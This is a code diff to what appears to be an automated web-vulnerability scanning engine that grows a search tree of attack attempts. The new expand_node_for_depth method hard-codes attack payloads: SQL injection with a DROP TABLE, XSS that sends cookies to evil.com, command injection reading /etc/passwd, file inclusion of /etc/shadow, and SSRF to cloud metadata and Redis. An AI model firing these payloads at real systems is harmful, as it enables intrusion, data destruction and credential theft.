@@ -502,8 +502,11 @@ class ExpansionEngine:
             if not self.quotas.can_create(discovery.discovery_type, tree, extra={"cycle": current_cycle}):
                 continue
 
+            # v15: source_node 作为 parent — 新分支挂载到产生发现的节点下 (depth+1)
+            source_node = tree.get_node(discovery.source_node_id)
+            parent = source_node if source_node else root
             created_nodes = self._create_branches_for_discovery(
-                tree, root, discovery, current_cycle, base_url
+                tree, parent, discovery, current_cycle, base_url
             )
 
             if created_nodes:
@@ -811,6 +814,76 @@ class ExpansionEngine:
             "technique": discovery.data.get("technique", filter_rules.get("bypass", "unknown")),
             "tech_name": discovery.data.get("tech_name", "unknown"),
         }
+
+    def expand_node_for_depth(
+        self, tree: SearchTree, node: SearchNode, current_cycle: int,
+    ) -> list[SearchNode]:
+        """v15: 为 NEEDS_EXPANSION 节点创建 depth+1 子节点 (不同探索方向)"""
+        created = []
+        facts = node.state.known_facts[-5:] if node.state.known_facts else []
+        tried = node.state.tried_actions[-5:] if node.state.tried_actions else []
+        parent = node
+
+        # 基于节点状态生成子方向
+        vuln = node.state.vuln_type
+        ep = node.state.current_endpoint
+        param = node.state.current_param
+
+        # 方向 1: 不同 payload (尝试 UNION / stacked / 报错注入等高级技术)
+        alt_payloads = {
+            "sql_injection": ["1 UNION SELECT 1,2,3--+", "1; DROP TABLE test--", "1 AND 1=CAST((SELECT @@version) AS INT)--"],
+            "xss": ["<svg/onload=alert(1)>", "\"-alert(1)-\"", "<img src=x onerror=fetch('http://evil.com?'+document.cookie)>"],
+            "rce": ["|whoami", "$(uname -a)", "&& cat /etc/passwd"],
+            "lfi": ["php://filter/convert.base64-encode/resource=index", "/proc/self/environ", "....//....//....//etc/shadow"],
+            "ssrf": ["http://169.254.169.254/latest/meta-data/", "gopher://127.0.0.1:6379/_INFO", "file:///etc/passwd"],
+        }
+        alt_list = alt_payloads.get(vuln, ["advanced_payload_1", "advanced_payload_2"])
+        for i, alt in enumerate(alt_list[:2]):
+            child = tree.create_child_node(
+                parent=parent, action="explore_depth",
+                action_params={"endpoint": ep, "param": param, "vuln_type": vuln, "payload": alt, "depth_strategy": f"alt_payload_{i}"},
+                vuln_type=vuln, endpoint=ep, param=param,
+                value_estimate=max(0.4, node.value_estimate * 0.85), created_at_cycle=current_cycle,
+            )
+            child.status = NodeStatus.SEED
+            created.append(child)
+
+        # 方向 2: 不同参数名 (尝试其他参数)
+        alt_params = {
+            "id": ["user_id", "uid", "pk", "rid"],
+            "q": ["query", "search", "keyword", "s"],
+            "cmd": ["exec", "command", "run", "action"],
+            "file": ["path", "include", "template", "page"],
+            "url": ["redirect", "callback", "next", "dest"],
+        }
+        current_p = param or ""
+        alt_p_list = alt_params.get(current_p, ["action", "type", "mode", "token"])
+        for alt_p in alt_p_list[:2]:
+            if alt_p == current_p:
+                continue
+            child = tree.create_child_node(
+                parent=parent, action="explore_depth",
+                action_params={"endpoint": ep, "param": alt_p, "vuln_type": vuln, "depth_strategy": "alt_param"},
+                vuln_type=vuln, endpoint=ep, param=alt_p,
+                value_estimate=max(0.35, node.value_estimate * 0.7), created_at_cycle=current_cycle,
+            )
+            child.status = NodeStatus.LOW_SIGNAL
+            created.append(child)
+
+        # 方向 3: 不同 HTTP 方法
+        for method in ["POST", "PUT"]:
+            child = tree.create_child_node(
+                parent=parent, action="explore_depth",
+                action_params={"endpoint": ep, "param": param, "vuln_type": vuln, "method": method, "depth_strategy": f"http_{method}"},
+                vuln_type=vuln, endpoint=ep, param=param,
+                value_estimate=max(0.3, node.value_estimate * 0.6), created_at_cycle=current_cycle,
+            )
+            child.status = NodeStatus.LOW_SIGNAL
+            created.append(child)
+
+        logger.info("expand_node_for_depth: %d children for %s @ %s (depth %d→%d)",
+                    len(created), vuln, ep, node.depth, node.depth + 1)
+        return created
 
     def get_expansion_stats(self) -> dict:
         """获取扩展统计"""
